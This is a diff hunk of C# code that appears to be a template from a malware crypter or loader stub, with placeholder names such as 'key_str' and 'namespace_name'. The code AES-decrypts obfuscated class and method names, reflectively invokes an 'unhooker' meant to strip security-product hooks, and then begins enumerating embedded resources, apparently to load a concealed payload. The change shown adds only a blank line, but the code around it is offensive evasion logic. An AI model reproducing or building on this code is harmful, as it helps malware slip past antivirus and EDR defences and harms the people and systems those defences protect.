@@ -86,6 +86,7 @@ namespace namespace_name
             string unhookerclass = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookerclass_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
             string unhookerfunction = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookerfunction_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
             unhookerasm.GetType(unhookerclass).GetMethod(unhookerfunction).Invoke(null, null);
+           
             Assembly asm = Assembly.GetExecutingAssembly();
             foreach (string name in asm.GetManifestResourceNames())
             {
